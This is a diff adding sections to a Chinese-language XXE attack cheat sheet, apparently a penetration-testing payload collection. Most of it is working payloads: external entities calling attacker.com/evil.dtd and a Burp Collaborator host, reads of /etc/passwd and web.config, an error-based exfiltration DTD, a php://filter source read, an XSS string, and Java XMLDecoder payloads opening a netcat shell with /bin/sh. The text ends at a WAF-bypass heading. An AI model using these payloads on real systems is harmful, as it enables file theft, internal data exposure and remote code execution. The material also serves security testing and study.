@@ -474,3 +474,298 @@ jar协议只能在Java 应用程序中访问。它旨在支持PKZIP存档（例�
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
 <foo>&xxe;</foo>
 ```
+
+### XSS
+
+```XML
+<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
+```
+
+### 内容类型
+
+如果 POST 请求接受 XML 格式的数据，您可以尝试利用该请求中的 XXE。例如，如果一个普通请求包含以下内容：
+
+```
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+```
+
+提交以下请求，可以得到相同的结果：
+```
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+```
+
+### JSON -> XXE
+
+```
+Content-Type: application/json;charset=UTF-8
+
+{"root": {"root": {
+  "firstName": "Avinash",
+  "lastName": "",
+  "country": "United States",
+  "city": "ddd",
+  "postalCode": "ddd"
+}}}
+```
+
+更改为:
+```
+Content-Type: application/xml;charset=UTF-8
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://主机IP地址/test.ext" >]>
+<root>
+ <root>
+  <firstName>&xxe;</firstName>
+  <lastName/>
+  <country>United States</country>
+  <city>ddd</city>
+  <postalCode>ddd</postalCode>
+ </root>
+</root>
+```
+
+### SOAP
+
+```XML
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+```
+
+### XLIFF
+
+```XML
+------WebKitFormBoundaryqBdAsEtYaBjTArl3
+Content-Disposition: form-data; name="file"; filename="xxe.xliff"
+Content-Type: application/x-xliff+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE XXE [
+<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
+<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
+------WebKitFormBoundaryqBdAsEtYaBjTArl3--
+```
+
+但是，此请求会触发内部服务器错误，特别提到标记声明的问题：
+```
+{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
+```
+
+尽管出现错误，Burp Collaborator 上仍记录了一次点击，表明与外部实体进行了某种程度的交互。
+
+为了获取数据，发送修改后的请求：
+```
+------WebKitFormBoundaryqBdAsEtYaBjTArl3
+Content-Disposition: form-data; name="file"; filename="xxe.xliff"
+Content-Type: application/x-xliff+xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE XXE [
+<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
+<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
+------WebKitFormBoundaryqBdAsEtYaBjTArl3--
+```
+
+这种方法表明用户代理指示使用 Java 1.8。此版本 Java 的一个值得注意的限制是无法使用带外技术检索包含换行符的文件，例如 /etc/passwd。
+
+为了克服这一限制，可以采用基于错误的方法。 DTD 文件的结构如下，可触发包含目标文件中的数据的错误：
+```XML
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
+%foo;
+%xxe;
+```
+
+### RSS
+
+PING BACK
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>XXE Test Blog</title>
+<link>http://example.com/</link>
+<description>XXE Test Blog</description>
+<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
+<item>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>Test Post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
+</item>
+</channel>
+</rss>
+```
+
+读取文件
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>The Blog</title>
+<link>http://example.com/</link>
+<description>A blog about things</description>
+<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+<item>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>a post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+</item>
+</channel>
+</rss>
+```
+
+获取源代码
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE title [ <!ELEMENT title ANY >
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+<channel>
+<title>The Blog</title>
+<link>http://example.com/</link>
+<description>A blog about things</description>
+<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
+<item>
+<title>&xxe;</title>
+<link>http://example.com</link>
+<description>a post</description>
+<author>author@example.com</author>
+<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
+</item>
+</channel>
+</rss>
+```
+
+### Java XMLDecoder XEE 到 RCE
+
+XMLDecoder 是一个基于 XML 消息创建对象的 Java 类。如果恶意用户可以让应用程序在调用readObject方法时使用任意数据，他将立即在服务器上获得代码执行权。
+
+1.
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.7.0_21" class="java.beans.XMLDecoder">
+ <object class="java.lang.Runtime" method="getRuntime">
+      <void method="exec">
+      <array class="java.lang.String" length="6">
+          <void index="0">
+              <string>/usr/bin/nc</string>
+          </void>
+          <void index="1">
+              <string>-l</string>
+          </void>
+          <void index="2">
+              <string>-p</string>
+          </void>
+          <void index="3">
+              <string>9999</string>
+          </void>
+          <void index="4">
+              <string>-e</string>
+          </void>
+          <void index="5">
+              <string>/bin/sh</string>
+          </void>
+      </array>
+      </void>
+ </object>
+</java>
+```
+
+2.
+```XML
+<?xml version="1.0" encoding="UTF-8"?>
+<java version="1.7.0_21" class="java.beans.XMLDecoder">
+  <void class="java.lang.ProcessBuilder">
+    <array class="java.lang.String" length="6">
+      <void index="0">
+        <string>/usr/bin/nc</string>
+      </void>
+      <void index="1">
+         <string>-l</string>
+      </void>
+      <void index="2">
+         <string>-p</string>
+      </void>
+      <void index="3">
+         <string>9999</string>
+      </void>
+      <void index="4">
+         <string>-e</string>
+      </void>
+      <void index="5">
+         <string>/bin/sh</string>
+      </void>
+    </array>
+    <void method="start" id="process">
+    </void>
+  </void>
+</java>
+```
+
+### Windows Local DTD 和 Side Channel Leak
+
+公开本地文件
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
+
+公开HTTP响应
+```xml
+<!DOCTYPE doc [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
+    <!ENTITY % SuperClass '>
+        <!ENTITY &#x25; file SYSTEM "https://erp.company.com">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+      <!ENTITY test "test"'
+    >
+    %local_dtd;
+  ]><xxx>cacat</xxx>
+```
+
+## 工具
+
+[XXE-xploiter](https://github.com/luisfontes19/xxexploiter)
+
+[xxeserv](https://github.com/staaldraad/xxeserv)
+
+[230-OOB](https://github.com/lc/230-OOB)
+
+[XXE-injector](https://github.com/enjoiz/XXEinjector)
+
+[oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)
+
+[docem](https://github.com/whitel1st/docem)
+
+[OTORI](http://www.beneaththewaves.net/Software/On_The_Outside_Reaching_In.html)
+```bash
+python ./otori.py --clone --module "G-XXE-Basic" --singleuri "file:///etc/passwd" --module-options "TEMPLATEFILE" "TARGETURL" "BASE64ENCODE" "DOCTYPE" "XMLTAG" --outputbase "./output-generic-solr" --overwrite --noerrorfiles --noemptyfiles --nowhitespacefiles --noemptydirs
+```
+
+## WAF 绕过
